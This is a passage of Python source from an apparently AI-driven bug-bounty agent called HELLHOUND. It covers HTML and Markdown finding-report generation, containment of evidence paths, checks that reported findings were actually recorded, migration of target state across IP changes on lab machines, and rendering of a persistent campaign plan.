        reports_dir.mkdir(parents=True, exist_ok=True)

        color = _SEVERITY_COLOR.get(severity, "#8a8f98")
        generated_at = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M UTC")
        note_html = (
            f'<div class="section-label">Evidence / Notes</div><p>{_html_escape(note).replace(chr(10), "<br>")}</p>'
            if note else ""
        )
        updated_html = (
            f'<div class="section-label">Update</div><p>{_html_escape(updated_note).replace(chr(10), "<br>")}</p>'
            if updated_note else ""
        )
        endpoint_html = f'<div class="meta">Endpoint: {_html_escape(request_ref)}</div>' if request_ref else ""
        # Real, byte-for-byte captured request/response — separate from the
        # narrative note above, and never model-authored: this is exactly
        # what _execute_curl saw on the wire for this endpoint.
        raw_evidence_html = ""
        if raw_evidence:
            blocks = "".join(_evidence_html_block(r) for r in raw_evidence)
            raw_evidence_html = f'<div class="section-label">Proof — Captured Request/Response</div>{blocks}'

        md_text = _finding_markdown(title, kind, severity, request_ref, note, raw_evidence, updated_note)

        html_doc = f"""<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8">
<title>{_html_escape(title)}</title>
<style>
  :root {{ color-scheme: dark; }}
  body {{ background:#0d0f14; color:#e6e8eb; font-family: -apple-system, Segoe UI, Roboto, sans-serif; max-width: 860px; margin: 0 auto; padding: 40px 24px 80px; line-height:1.55; }}
  h1 {{ font-size: 1.6em; border-bottom: 2px solid {color}; padding-bottom: 12px; }}
  .meta {{ color:#9aa0a8; font-size:.9em; margin-bottom: 10px; }}
  .finding {{ background:#12151c; border:1px solid #262b36; border-radius:10px; padding:22px 24px; margin-top:20px; }}
  .sev-badge {{ display:inline-block; color:#0d0f14; font-weight:700; font-size:.75em; padding:3px 10px; border-radius:999px; letter-spacing:.04em; background:{color}; margin-bottom:10px; }}
  .section-label {{ text-transform:uppercase; letter-spacing:.06em; font-size:.72em; color:#7d8590; margin:14px 0 4px; font-weight:600; }}
  .code-block {{ background:#0a0c10; border:1px solid #262b36; border-radius:6px; padding:12px 14px; overflow-x:auto; font-size:.82em; white-space:pre-wrap; word-break:break-all; margin-bottom:10px; }}
  .kind {{ color:#7d8590; font-size:.85em; }}
  .copy-btn {{ background:#1c2029; border:1px solid #333a47; color:#c7ccd3; font-size:.72em; padding:3px 10px; border-radius:6px; cursor:pointer; margin-left:8px; }}
  .copy-btn:hover {{ background:#262b36; }}
  .copy-btn.copied {{ background:#1f3d2a; border-color:#2f6b41; color:#8fe0a6; }}
  footer {{ margin-top:40px; color:#5c6370; font-size:.8em; text-align:center; }}
</style></head>
<body>
<h1>{_html_escape(title)} <button class="copy-btn" onclick="hhCopy('finding-src', this)">Copy as Markdown</button></h1>
<template id="finding-src">{_html_escape(md_text)}</template>
<div class="meta">Target: {_html_escape(target.host or target.name)} &nbsp;·&nbsp; Generated {generated_at}</div>
<div class="finding">
  <span class="sev-badge">{_html_escape(severity.upper())}</span>
  <div class="kind">Category: {_html_escape(kind)}</div>
  {endpoint_html}
  {note_html}
  {updated_html}
  {raw_evidence_html}
</div>
<footer>Auto-saved by HELLHOUND the moment this finding was confirmed — run export_report at the end of the session for a single combined write-up of every finding.</footer>
<script>
function hhCopy(id, btn) {{
  var el = document.getElementById(id);
  if (!el) return;
  var text = el.content ? el.content.textContent : el.textContent;
  var done = function() {{
    var orig = btn.textContent;
    btn.textContent = 'Copied';
    btn.classList.add('copied');
    setTimeout(function() {{ btn.textContent = orig; btn.classList.remove('copied'); }}, 1400);
  }};
  if (navigator.clipboard && navigator.clipboard.writeText) {{
    navigator.clipboard.writeText(text).then(done, function() {{
      var ta = document.createElement('textarea');
      ta.value = text; document.body.appendChild(ta); ta.select();
      try {{ document.execCommand('copy'); done(); }} catch (e) {{}}
      document.body.removeChild(ta);
    }});
  }} else {{
    var ta = document.createElement('textarea');
    ta.value = text; document.body.appendChild(ta); ta.select();
    try {{ document.execCommand('copy'); done(); }} catch (e) {{}}
    document.body.removeChild(ta);
  }}
}}
</script>
</body></html>"""

        if existing_path:
            out_path = Path(existing_path)
            out_path.parent.mkdir(parents=True, exist_ok=True)
        else:
            safe_target = re.sub(r"[^A-Za-z0-9._-]+", "_", target_name).strip("_") or "default"
            fname = f"finding_{safe_target}_{datetime.now(timezone.utc).strftime('%Y%m%dT%H%M%S')}.html"
            out_path = reports_dir / fname
        out_path.write_text(html_doc, encoding="utf-8")

        if emit and hasattr(emit, "success"):
            verb = "updated" if existing_path else "auto-saved"
            emit.success(f"[✓] Finding report {verb}: {out_path}")
        return str(out_path)
    except Exception as e:
        logger.debug(f"Auto finding-report save failed (non-fatal): {e}")
        return None


def _resolve_report_evidence_path(target: Target, ref: str) -> Optional[Path]:
    """
    Resolves a screenshot_ref/request_ref/response_ref (as stored on a
    finding or evidence card) to an actual file under this target's own
    storage directory. Accepts a bare filename, a path relative to the
    target dir, or an absolute path — but only ever returns a path that is
    strictly inside ~/.hellhound/targets/<target>/, the same containment
    rule read_artifact enforces, so a report can never be tricked into
    embedding an arbitrary file off the target's own storage.
    """
    if not ref:
        return None
    target_name = target.name if (target and target.name) else "default"
    base_dir = Path(os.path.expanduser(f"~/.hellhound/targets/{target_name}")).resolve()
    candidates = [
        Path(os.path.expanduser(ref)),
        base_dir / ref,
        base_dir / "screenshots" / ref,
        base_dir / "raw" / ref,
    ]
    for c in candidates:
        try:
            resolved = c.resolve()
            if resolved.is_file() and str(resolved).startswith(str(base_dir)):
                return resolved
        except (OSError, ValueError):
            continue
    return None


def _render_steps_to_reproduce(raw: Any) -> str:
    """
    Renders a finding's steps_to_reproduce as a numbered HTML list, one
    <li> per step, instead of dumping everything into a single <p> with
    <br> substitutions (which collapses into an unreadable wall of text
    whenever the writer doesn't happen to include a literal newline per
    step).

    Accepts either:
      - a list of step strings (preferred — forces one step per item), or
      - a single string, which is split heuristically on numbered-list
        markers ("1.", "2)", etc.) or blank lines if the writer didn't
        pass a list.

    A run enclosed in ``` fences within a step is rendered as its own
    <pre class="code-block"> so request/response blocks stay monospaced
    and distinct from the surrounding prose.
    """
    if isinstance(raw, list):
        steps = [str(s).strip() for s in raw if str(s).strip()]
        # Each array entry is meant to be ONE step's content, but writers
        # (models included) often prefix it with its own "1. "/"2)" marker
        # out of habit — even though the <ol> below already numbers it.
        # Strip a single leading marker per item so the report doesn't show
        # "1. 1. Send POST request..." / "2. 2. Extract the token...".
        steps = [re.sub(r"^(?:step\s*)?\d{1,2}[\.\)]\s+", "", s, flags=re.IGNORECASE) for s in steps]
    else:
        text = str(raw or "").strip()
        if not text:
            steps = []
        else:
            # Split on a numbered-list marker ("1. ", "2) ", "Step 3:") —
            # this is how the report-writing skill teaches steps to be
            # written even when the model emits them as one string instead
            # of an array, and even if it wrote the whole thing without a
            # single newline (start-of-string or any run of whitespace
            # counts as a boundary, not just a line break).
            parts = re.split(r"(?:(?<=^)|(?<=\s))(?:step\s*)?\d{1,2}[\.\)]\s+", text, flags=re.IGNORECASE)
            parts = [p.strip() for p in parts if p.strip()]
            steps = parts if len(parts) > 1 else [text]

    if not steps:
        return ""

    def _render_step_body(step: str) -> str:
        # Render fenced code blocks as <pre>, everything else as escaped
        # text with real newlines preserved as <br>.
        pieces = re.split(r"```(?:\w+\n)?(.*?)```", step, flags=re.DOTALL)
        out = []
        for i, piece in enumerate(pieces):
            if i % 2 == 1:
                out.append(f'<pre class="code-block">{_html_escape(piece.strip())}</pre>')
            else:
                escaped = _html_escape(piece.strip()).replace("\n", "<br>")
                if escaped:
                    out.append(f"<div>{escaped}</div>")
        return "".join(out)

    items = "".join(f"<li>{_render_step_body(s)}</li>" for s in steps)
    return f'<ol class="steps-list">{items}</ol>'


def _embed_image_base64(path: Path) -> Optional[str]:
    try:
        ext = path.suffix.lower().lstrip(".") or "png"
        mime = {"png": "image/png", "jpg": "image/jpeg", "jpeg": "image/jpeg", "gif": "image/gif", "webp": "image/webp"}.get(ext, "image/png")
        data = base64.b64encode(path.read_bytes()).decode("ascii")
        return f"data:{mime};base64,{data}"
    except Exception:
        return None


def _execute_export_report(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """
    Assembles a polished, self-contained HTML report from this target's
    recorded findings and evidence — one portable .html file with every
    screenshot embedded as base64 (no linked files that break the moment the
    report leaves this machine — e.g. when it's attached to a HackerOne or
    Bugcrowd submission).

    IMPORTANT — division of labor: this tool does NOT write the narrative
    for you. The title, executive summary, impact statements, and steps to
    reproduce are YOUR writing — follow the report-writing skill's
    methodology (impact-first, CVSS 3.1 scoring, never "could potentially" —
    prove it or don't claim it) before calling this. This tool's only job is
    to faithfully assemble and embed everything you give it, and to check
    your work: every finding_ref you pass MUST match an actual recorded
    finding or evidence card for this target (fabricated/unmatched refs are
    rejected, not silently included), and any RECORDED finding you leave out
    of the report gets flagged back to you rather than silently dropped —
    the researcher asked for a report with nothing missing, not a partial one.
    """
    findings_arg = args.get("findings")
    if not isinstance(findings_arg, list) or not findings_arg:
        # Mirror jwt_forge's "not_a_jwt" convention: this is a mistake in
        # how the call was just made, not the tool breaking — say so in the
        # same first-person, self-correcting voice rather than a flat
        # validation string that reads like a system failure.
        return {
            "status": "no_findings_given",
            "note": "Nah bro, that call had no findings array — nothing here to turn into a report. Pass at least one finding object with finding_ref (must match a title already logged via record_finding) and severity. If nothing's confirmed yet, go call record_finding first, then come back to this.",
        }

    report_title = str(args.get("report_title") or f"Security Assessment Report — {target.host or target.name}").strip()
    executive_summary = str(args.get("executive_summary") or "").strip()
    include_timeline = bool(args.get("include_timeline", True))

    # ── Cross-validate against what was actually recorded ──
    # Build the set of known, actually-recorded finding identities so a
    # fabricated or garbled finding_ref can't slip into the report.
    recorded_titles = set()
    # type -> finding dict, so real curl-captured evidence (attached at
    # record_finding time — see _lookup_curl_evidence) can be pulled in
    # below regardless of whether the model remembers to pass
    # evidence_snippet, or what it types there.
    findings_by_type: Dict[str, Dict[str, Any]] = {}
    for f in (target.findings or []):
        if isinstance(f, dict) and f.get("type"):
            key = str(f["type"]).strip().lower()
            recorded_titles.add(key)
            findings_by_type[key] = f
    evidence_cards = target.state.get("recent_evidence") or []
    evidence_by_title = {}
    for card in evidence_cards:
        if isinstance(card, dict) and card.get("title"):
            key = str(card["title"]).strip().lower()
            recorded_titles.add(key)
            evidence_by_title[key] = card

    unmatched_refs = []
    included_titles_lower = set()
    resolved_findings = []
    for item in findings_arg:
        if not isinstance(item, dict):
            continue
        finding_ref = str(item.get("finding_ref", "")).strip()
        ref_lower = finding_ref.lower()
        # Fuzzy match: exact, or substring either direction — wording often
        # differs slightly between the recorded title and how it's referenced
        # here, and rejecting on that alone would block legitimate reports.
        matched = ref_lower in recorded_titles or any(
            ref_lower in t or t in ref_lower for t in recorded_titles
        )
        if not matched:
            unmatched_refs.append(finding_ref)
            continue
        included_titles_lower.add(ref_lower)
        resolved_findings.append(item)

    if not resolved_findings:
        return {
            "status": "no_matching_findings",
            "note": f"Nah bro, none of those finding_ref values matched anything actually recorded for this target — {', '.join(unmatched_refs) if unmatched_refs else 'nothing to go on'}. Not going to include a finding I can't verify was really logged. Call record_finding first for each confirmed result (or check target.findings for the exact title wording), then retry export_report with those as finding_ref.",
            "unmatched_refs": unmatched_refs,
        }

    # What got recorded but left out of the report entirely?
    all_recorded_display = set()
    for f in (target.findings or []):
        if isinstance(f, dict) and f.get("type"):
            all_recorded_display.add(str(f["type"]).strip())
    for card in evidence_cards:
        if isinstance(card, dict) and card.get("title") and card.get("type") != "screenshot":
            all_recorded_display.add(str(card["title"]).strip())
    omitted = sorted(
        t for t in all_recorded_display
        if t.strip().lower() not in included_titles_lower
        and not any(t.strip().lower() in inc or inc in t.strip().lower() for inc in included_titles_lower)
    )

    # ── Render ──
    resolved_findings.sort(key=lambda it: _SEVERITY_ORDER.get(str(it.get("severity", "info")).lower(), 4))

    findings_html_parts = []
    findings_markdown_parts = []
    total_screenshots_embedded = 0
    for idx, item in enumerate(resolved_findings, 1):
        raw_finding_ref = str(item.get("finding_ref", "Untitled finding"))
        title = _html_escape(raw_finding_ref)
        severity = str(item.get("severity", "info")).lower()
        if severity not in _SEVERITY_ORDER:
            severity = "info"
        color = _SEVERITY_COLOR[severity]
        cvss = _html_escape(item.get("cvss_score", "")) if item.get("cvss_score") else ""
        impact = _html_escape(item.get("impact_statement", "")).replace("\n", "<br>")
        steps_html = _render_steps_to_reproduce(item.get("steps_to_reproduce", ""))
        evidence_snippet = item.get("evidence_snippet", "")

        # Pull the REAL captured request/response for this finding, keyed
        # off the same fuzzy title match used to validate finding_ref above
        # — independent of whatever the model passed (or didn't pass) as
        # evidence_snippet. This is what actually fixes a report showing
        # fabricated placeholder curl output: it's now backed by what the
        # server literally returned during this session.
        ref_lower_lookup = raw_finding_ref.strip().lower()
        real_finding = findings_by_type.get(ref_lower_lookup)
        if not real_finding:
            for ftype_key, fdict in findings_by_type.items():
                if ref_lower_lookup and (ref_lower_lookup in ftype_key or ftype_key in ref_lower_lookup):
                    real_finding = fdict
                    break
        real_evidence_list = (real_finding.get("raw_evidence") if real_finding else None) or []

        shots_html = ""
        refs = item.get("screenshot_refs") or []
        if isinstance(refs, str):
            refs = [refs]
        # Auto-attach a screenshot the researcher never had to ask for:
        # the model routinely forgets to pass screenshot_refs even when
        # gowitness/browser_control already captured one for this exact
        # endpoint earlier in the session — the report then has a PoC curl
        # but no visual, which is exactly what got flagged ("no images that
        # he captured were attached"). Match on the finding's own recorded
        # target URL (same fuzzy containment-either-direction match used
        # for curl evidence above) against target.state["screenshots"]
        # (gowitness) — only when the model gave nothing explicit, so a
        # deliberate screenshot_refs list is never overridden.
        if not refs:
            finding_target_url = (real_finding.get("target") if real_finding else "") or ""
            if finding_target_url:
                ft_lower = finding_target_url.strip().lower()
                for shot in reversed(target.state.get("screenshots") or []):
                    if not isinstance(shot, dict):
                        continue
                    shot_url = (shot.get("url") or shot.get("final_url") or "").strip().lower()
                    shot_path = shot.get("file_path")
                    if shot_url and shot_path and (ft_lower in shot_url or shot_url in ft_lower):
                        refs = [shot_path]
                        break
        for ref in refs:
            p = _resolve_report_evidence_path(target, str(ref))
            if p:
                data_uri = _embed_image_base64(p)
                if data_uri:
                    shots_html += f'<div class="evidence-shot"><img src="{data_uri}" alt="Evidence screenshot"></div>'
                    total_screenshots_embedded += 1

        evidence_block = ""
        if evidence_snippet:
            evidence_block += f'<div class="section-label">Evidence</div><pre class="code-block">{_html_escape(evidence_snippet)}</pre>'
        if real_evidence_list:
            proof_label = "Proof — Captured Request/Response" if len(real_evidence_list) == 1 else "Proof — Captured Requests/Responses"
            evidence_block += f'<div class="section-label">{proof_label}</div>' + "".join(
                _evidence_html_block(r) for r in real_evidence_list
            )

        # Markdown version of this finding, for both its own per-finding
        # copy button AND as a section of the overall report-wide Markdown
        # built below — real Markdown (headers/bold/fenced code), not flat
        # plain text, since that's what HackerOne/Bugcrowd report fields
        # actually render properly: a pasted fenced code block stays a
        # code block, a numbered list stays numbered, instead of
        # collapsing into one run-on paragraph.
        finding_md_parts = [f"## {idx}. {item.get('finding_ref', 'Untitled finding')}", ""]
        sev_cvss_line = f"**Severity:** {severity.upper()}"
        if cvss:
            sev_cvss_line += f"  \n**CVSS:** {item.get('cvss_score', '')}"
        finding_md_parts += [sev_cvss_line, ""]
        if impact:
            finding_md_parts += ["### Impact", "", str(item.get("impact_statement", "")), ""]
        raw_steps = item.get("steps_to_reproduce", "")
        if raw_steps:
            if isinstance(raw_steps, list):
                steps_md = "\n".join(f"{i}. {s}" for i, s in enumerate(raw_steps, 1))
            else:
                # Already free-form text from the model — pass through as-is
                # rather than re-numbering lines that may not be a clean list.
                steps_md = str(raw_steps)
            finding_md_parts += ["### Steps to Reproduce", "", steps_md, ""]
        if evidence_snippet:
            finding_md_parts += ["### Evidence", "", "```", str(evidence_snippet), "```", ""]
        if real_evidence_list:
            proof_label_md = "### Proof — Captured Request/Response" if len(real_evidence_list) == 1 else "### Proof — Captured Requests/Responses"
            finding_md_parts.append(proof_label_md)
            finding_md_parts.append("")
            for r in real_evidence_list:
                finding_md_parts.append(_evidence_markdown_block(r))
        finding_md_text = "\n".join(finding_md_parts).rstrip() + "\n"
        findings_markdown_parts.append(finding_md_text)

        findings_html_parts.append(f"""
<div class="finding" id="finding-{idx}">
  <div class="finding-header">
    <span class="sev-badge" style="background:{color}">{severity.upper()}</span>
    <h2>{idx}. {title}</h2>
    {f'<span class="cvss">CVSS {cvss}</span>' if cvss else ''}
    <button class="copy-btn" onclick="hhCopy('finding-src-{idx}', this)">Copy as Markdown</button>
  </div>
  {f'<div class="section-label">Impact</div><p>{impact}</p>' if impact else ''}
  {f'<div class="section-label">Steps to Reproduce</div>{steps_html}' if steps_html else ''}
  {evidence_block}
  {f'<div class="section-label">Screenshots</div><div class="evidence-shots">{shots_html}</div>' if shots_html else ''}
  <template id="finding-src-{idx}">{_html_escape(finding_md_text)}</template>
</div>""")

    timeline_html = ""
    if include_timeline:
        timeline = target.state.get("timeline") or []
        if timeline:
            rows = "".join(
                f'<div class="tl-row"><span class="tl-ts">{_html_escape(e.get("ts", ""))}</span><span class="tl-event">{_html_escape(e.get("event", ""))}</span></div>'
                for e in timeline if isinstance(e, dict)
            )
            timeline_html = f'<h2>Investigation Timeline</h2><div class="timeline">{rows}</div>'

    warnings = []
    if unmatched_refs:
        warnings.append(f"{len(unmatched_refs)} finding_ref(s) did not match any recorded finding and were skipped: {', '.join(unmatched_refs)}")
    if omitted:
        warnings.append(f"{len(omitted)} recorded finding(s) were NOT included in this report: {', '.join(omitted)}")
    warnings_html = ""
    if warnings:
        warnings_html = '<div class="warn-box"><strong>⚠ Report completeness warnings</strong><ul>' + "".join(f"<li>{_html_escape(w)}</li>" for w in warnings) + '</ul></div>'

    researcher_handle = str(load_config().get("researcher_handle") or "").strip()
    generated_at = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M UTC")

    # Single, whole-report Markdown — this is the actual point of the copy
    # buttons existing at all: HackerOne/Bugcrowd submission fields render
    # Markdown properly (headers, bold, fenced code), so pasting this one
    # block directly into "Report details" should need little to no manual
    # reformatting, instead of copying each finding separately and
    # stitching them together by hand.
    report_md_parts = [f"# {report_title}", ""]
    report_md_parts.append(f"**Target:** {target.host or target.name}  ")
    report_md_parts.append(f"**Generated:** {generated_at}" + (f"  \n**Researcher:** {researcher_handle}" if researcher_handle else ""))
    report_md_parts.append("")
    if executive_summary:
        report_md_parts += ["## Summary", "", executive_summary, ""]
    report_md_parts.append("".join(findings_markdown_parts).rstrip())
    report_md_text = "\n".join(report_md_parts).rstrip() + "\n"

    html_doc = f"""<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8">
<title>{_html_escape(report_title)}</title>
<style>
  :root {{ color-scheme: dark; }}
  body {{ background:#0d0f14; color:#e6e8eb; font-family: -apple-system, Segoe UI, Roboto, sans-serif; max-width: 960px; margin: 0 auto; padding: 40px 24px 80px; line-height:1.55; }}
  h1 {{ font-size: 1.9em; border-bottom: 2px solid #ff3860; padding-bottom: 12px; }}
  h2 {{ font-size: 1.25em; margin: 0; }}
  .meta {{ color:#9aa0a8; font-size:.9em; margin-bottom: 28px; }}
  .summary {{ background:#161922; border:1px solid #262b36; border-radius:8px; padding:18px 20px; margin-bottom:32px; }}
  .finding {{ background:#12151c; border:1px solid #262b36; border-radius:10px; padding:22px 24px; margin-bottom:22px; }}
  .finding-header {{ display:flex; align-items:center; gap:12px; margin-bottom:14px; flex-wrap:wrap; }}
  .sev-badge {{ color:#0d0f14; font-weight:700; font-size:.75em; padding:3px 10px; border-radius:999px; letter-spacing:.04em; }}
  .cvss {{ margin-left:auto; color:#9aa0a8; font-size:.85em; }}
  .section-label {{ text-transform:uppercase; letter-spacing:.06em; font-size:.72em; color:#7d8590; margin:14px 0 4px; font-weight:600; }}
  .code-block {{ background:#0a0c10; border:1px solid #262b36; border-radius:6px; padding:12px 14px; overflow-x:auto; font-size:.85em; white-space:pre-wrap; word-break:break-all; }}
  .steps-list {{ margin:6px 0 0; padding-left:22px; }}
  .steps-list li {{ margin-bottom:10px; }}
  .steps-list .code-block {{ margin-top:6px; }}
  .copy-btn {{ background:#1c2029; border:1px solid #333a47; color:#c7ccd3; font-size:.72em; padding:3px 10px; border-radius:6px; cursor:pointer; margin-left:8px; }}
  .copy-btn:hover {{ background:#262b36; }}
  .copy-btn.copied {{ background:#1f3d2a; border-color:#2f6b41; color:#8fe0a6; }}
  .copy-btn-primary {{ background:#3a1f12; border-color:#ff7a45; color:#ffb088; font-weight:600; margin-left:0; }}
  .copy-btn-primary:hover {{ background:#4a2817; }}
  .evidence-shots {{ display:flex; flex-wrap:wrap; gap:12px; }}
  .evidence-shot img {{ max-width:100%; border-radius:6px; border:1px solid #262b36; }}
  .warn-box {{ background:#2a1a10; border:1px solid #6b3a12; border-radius:8px; padding:14px 18px; margin-bottom:28px; font-size:.9em; }}
  .timeline {{ font-size:.85em; }}
  .tl-row {{ display:flex; gap:14px; padding:5px 0; border-bottom:1px solid #1c2029; }}
  .tl-ts {{ color:#7d8590; white-space:nowrap; }}
  footer {{ margin-top:60px; color:#5c6370; font-size:.8em; text-align:center; }}
</style></head>
<body>
<h1>{_html_escape(report_title)} <button class="copy-btn" onclick="hhCopy('title-src', this)">Copy</button></h1>
<template id="title-src">{_html_escape(report_title)}</template>
<div class="meta">Target: {_html_escape(target.host or target.name)} &nbsp;·&nbsp; Generated {generated_at}{f' &nbsp;·&nbsp; {_html_escape(researcher_handle)}' if researcher_handle else ''}
  &nbsp;·&nbsp; <button class="copy-btn copy-btn-primary" onclick="hhCopy('report-md-src', this)">Copy Full Report as Markdown</button>
</div>
<template id="report-md-src">{_html_escape(report_md_text)}</template>
{f'<div class="summary">{_html_escape(executive_summary).replace(chr(10), "<br>")} <button class="copy-btn" onclick="hhCopy(&#39;summary-src&#39;, this)">Copy</button><template id="summary-src">{_html_escape(executive_summary)}</template></div>' if executive_summary else ''}
{warnings_html}
{"".join(findings_html_parts)}
{timeline_html}
<footer>Generated by HELLHOUND — {len(resolved_findings)} finding(s), {total_screenshots_embedded} screenshot(s) embedded.</footer>
<script>
function hhCopy(id, btn) {{
  var el = document.getElementById(id);
  if (!el) return;
  var text = el.content ? el.content.textContent : el.textContent;
  var done = function() {{
    var orig = btn.textContent;
    btn.textContent = 'Copied';
    btn.classList.add('copied');
    setTimeout(function() {{ btn.textContent = orig; btn.classList.remove('copied'); }}, 1400);
  }};
  if (navigator.clipboard && navigator.clipboard.writeText) {{
    navigator.clipboard.writeText(text).then(done, function() {{
      var ta = document.createElement('textarea');
      ta.value = text; document.body.appendChild(ta); ta.select();
      try {{ document.execCommand('copy'); done(); }} catch (e) {{}}
      document.body.removeChild(ta);
    }});
  }} else {{
    var ta = document.createElement('textarea');
    ta.value = text; document.body.appendChild(ta); ta.select();
    try {{ document.execCommand('copy'); done(); }} catch (e) {{}}
    document.body.removeChild(ta);
  }}
}}
</script>
</body></html>"""

    target_name = target.name if (target and target.name) else "default"
    reports_dir = Path(os.path.expanduser(f"~/.hellhound/targets/{target_name}/reports"))
    reports_dir.mkdir(parents=True, exist_ok=True)
    # Filename carries the target name, not just a timestamp — a report
    # pulled out of its target folder (attached to an email, dropped in a
    # shared drive, etc.) should still be identifiable on sight.
    safe_target_for_fname = re.sub(r"[^A-Za-z0-9._-]+", "_", target_name).strip("_") or "default"
    # Default is a STABLE filename that re-running export_report overwrites
    # in place — the researcher asking to "update the report" with more
    # evidence should update the file they already have open, not scatter a
    # disconnected new timestamped copy next to it every time. Pass
    # new_file=true explicitly to snapshot the current report under its own
    # timestamp instead (e.g. for versioning before/after a fix is applied).
    if bool(args.get("new_file", False)):
        fname = f"report_{safe_target_for_fname}_{datetime.now(timezone.utc).strftime('%Y%m%dT%H%M%S')}.html"
    else:
        fname = f"report_{safe_target_for_fname}.html"
    out_path = reports_dir / fname
    try:
        out_path.write_text(html_doc, encoding="utf-8")
    except Exception as e:
        return {"error": f"Failed to write report file: {e}"}

    # Also save the SAME report content as a standalone .md file, reusing
    # report_md_text already built above for the HTML's "Copy as Markdown"
    # button — no separate generation step. This is what actually fixes a
    # real duplication bug: before this, the only way to get a GitHub-
    # flavored Markdown version was the model retyping the whole report a
    # second time directly into the chat reply when asked for "clean
    # GitHub Markdown," producing two different-looking write-ups of the
    # same findings. Now there's one real artifact in each format, both
    # generated from the exact same data, and nothing needs to be pasted
    # into the chat response at all — see the doctrine note at this tool's
    # registration about never re-emitting this text in prose.
    md_fname = fname[:-5] + ".md" if fname.endswith(".html") else fname + ".md"
    md_out_path = reports_dir / md_fname
    md_write_error = None
    try:
        md_out_path.write_text(report_md_text, encoding="utf-8")
    except Exception as e:
        md_write_error = str(e)  # non-fatal — the HTML report is still the primary deliverable

    if emit and hasattr(emit, "success"):
        emit.success(f"[✓] Report written: {out_path} ({len(resolved_findings)} finding(s), {total_screenshots_embedded} screenshot(s) embedded)")

    result = {
        "status": "success",
        "path": str(out_path),
        "markdown_path": str(md_out_path) if not md_write_error else None,
        "findings_included": len(resolved_findings),
        "screenshots_embedded": total_screenshots_embedded,
        "note": (
            "Both the HTML report and a matching .md file were written to disk from the same data — "
            "do NOT also retype/paste the report (or a markdown version of it) into your chat reply. "
            "Tell the researcher it's ready and give the path(s); if they specifically want the "
            "Markdown text pasted inline for a quick copy-paste, that's fine to do ONCE on explicit "
            "request, but it is not the default."
        ),
    }
    if unmatched_refs:
        result["unmatched_refs"] = unmatched_refs
    if omitted:
        result["omitted_recorded_findings"] = omitted
    return result


def _rehost_value(obj: Any, old_host: str, new_host: str) -> Any:
    """Recursively rewrites any string in obj that contains old_host to use
    new_host instead -- used by _migrate_target_state so carried-forward
    state (a captured login recipe's URL, discovered routes, spider_intel,
    etc.) doesn't silently keep pointing at a dead IP after a rotating-IP
    box (THM/HTB-style) hands out a new one."""
    if not old_host or old_host == new_host:
        return obj
    if isinstance(obj, str):
        return obj.replace(old_host, new_host) if old_host in obj else obj
    if isinstance(obj, dict):
        return {k: _rehost_value(v, old_host, new_host) for k, v in obj.items()}
    if isinstance(obj, list):
        return [_rehost_value(v, old_host, new_host) for v in obj]
    return obj


def _migrate_target_state(old_target: Target, new_host: str) -> Target:
    """
    Carries everything learned on `old_target` forward onto a target for
    `new_host` -- for the "same logical box, IP rotated" case (THM/HTB
    machines that hand out a fresh IP on every reboot/restart). Without
    this, switching to the new IP via plain set_target silently starts a
    brand-new, EMPTY Target: every bit of recon already done (users found,
    plugins fingerprinted, a captured login recipe, notes, findings, the
    whole prior conversation) is gone, and the agent re-discovers the site
    from scratch and has to be manually re-told "it's the same target" --
    exactly the failure this closes.

    Deliberately asymmetric about what's carried forward: nearly everything
    survives a reboot (what plugins/users/endpoints exist, what's been
    tried, what's been found), but live session cookies/tokens almost
    certainly do NOT survive a full machine restart, so those are dropped
    rather than carried forward as a guaranteed-dead session that would
    silently poison every following request-sending tool call. The login
    RECIPE (url/method/payload shape) is kept -- that's what lets
    auto-relogin immediately re-establish a session against the new host
    instead of needing the login flow re-discovered too.
    """
    old_host_str = old_target.host or old_target.name
    new_raw_host = extract_raw_host(new_host) or new_host
    new_target = create_or_load_target(new_host)

    carried_state = _rehost_value(dict(old_target.state or {}), old_host_str, new_raw_host)
    # Drop anything tied to a session that's almost certainly dead after a
    # full machine restart -- carrying these forward would make every
    # following curl/content-discovery/sqlmap call look authenticated while
    # silently hitting a logged-out response, which is worse than starting
    # with none at all (that case is already handled -- curl's session-dead
    # detection + auto-relogin -- but only if it's told there's no session).
    for dead_key in ("cookies", "session_cookie", "_last_tool_output", "last_reauth_attempt_ts"):
        carried_state.pop(dead_key, None)
    history = carried_state.pop("history", None)

    new_target.state.update(carried_state)
    if isinstance(history, list):
        new_target.state["history"] = history

    new_target.findings = list(old_target.findings or [])
    timestamp = datetime.now(timezone.utc).isoformat()
    migration_note = f"[{timestamp}] Migrated from {old_host_str} — same logical target, IP rotated (old box restarted/respawned)."
    new_target.notes = (str(old_target.notes or "") + "\n" + migration_note).strip()

    # Breadcrumb on the OLD target too, so it's a traceable handoff rather
    # than a silent dead end if anything ever looks it up again.
    old_target.state["rotated_to_host"] = new_raw_host
    old_target.notes = (str(old_target.notes or "") + f"\n[{timestamp}] Superseded — IP rotated to {new_raw_host}.").strip()
    save_target(old_target)
    save_target(new_target)
    return new_target


def _format_campaign_plan_block(target: Target) -> str:
    """
    Renders target.state['campaign_plan'] (set/updated via the update_plan
    tool) into the same kind of always-injected prompt block lessons/
    investigation-summary already use. This is the direct answer to "the
    agent can't plan or think ahead, it just reacts turn to turn": the plan
    itself now PERSISTS in the same structured target.state every other
    piece of cross-turn memory lives in (survives a target-IP migration,
    a session restart, a long gap between messages), and is re-shown on
    EVERY orchestrator turn without the researcher re-explaining the
    objective or the model needing to re-derive it from scrollback.

    Deliberately NOT a separate planner/executor process or an external
    orchestrator loop — this runs inside the existing single-turn tool-call
    loop, same as every other tool here. What it actually buys: the model
    can set a multi-step goal once, see exactly which steps are done/
    pending/blocked on every subsequent turn (including a brand new
    message hours later), and a researcher saying "continue" has something
    concrete to continue FROM instead of the model re-reading chat history
    and guessing. What it does NOT buy on its own: running for hours
    without any new researcher message — that's a property of the host
    loop that calls this agent per-message, not of what's stored here.
    """
    plan = target.state.get("campaign_plan") if (target and isinstance(target.state, dict)) else None
    if not isinstance(plan, dict) or not plan.get("steps"):
        return ""
    lines = ["ACTIVE CAMPAIGN PLAN (persists across turns and target-IP migrations — update it with `update_plan` as steps complete; do not silently abandon it without saying so):"]
    goal = plan.get("goal")
    if goal:
        lines.append(f"Goal: {goal}")
    for step in plan.get("steps", [])[:25]:
        if not isinstance(step, dict):
            continue
        status = step.get("status", "pending")
        marker = {"done": "[x]", "blocked": "[!]", "pending": "[ ]"}.get(status, "[ ]")
